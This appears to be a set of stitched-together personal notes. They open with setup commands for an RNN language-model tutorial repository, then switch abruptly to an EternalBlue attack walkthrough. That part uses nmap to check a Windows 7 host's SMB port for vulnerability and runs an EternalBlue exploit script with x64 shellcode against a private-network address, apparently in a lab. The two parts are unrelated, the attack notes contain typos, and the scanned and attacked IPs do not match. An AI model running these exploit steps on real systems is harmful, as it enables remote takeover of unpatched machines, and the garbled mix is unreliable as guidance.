# Clone the repo
git clone https://github.com/dennybritz/rnn-tutorial-rnnlm
cd rnn-tutorial-rnnlm

# Create a new virtual environment (optional, but recommended)
virtualenv venv
source venv/bin/activate

# Install requirements
pip install -r requirements.txt
# Start the notebook server
jupyter notebook

```
cd /to the dir whre you have requirements.txt/
virtualenv venv1   
source venv/bin/activate
pip install -r requirements.txt
pip list ##to see the list of packages installed.

```

Now take a look at the shellcode.sh this will generate the shellcode.
Now before we do this lets check if the target is vuln or not?

use namp
```
sudo nmap -sV -p 445 -O 10.0.2.5
-- target is win 7
ls -la /usr/share/nmap/scripts | grep smb-

--let's see if this target is vuln to smb- script
nmap -sV -p 445 -O --script=smb- 10.0.2.5 
```

python eternalblue_exploit7.py 10.0.2.6 shellcode/sc_x64.bin 
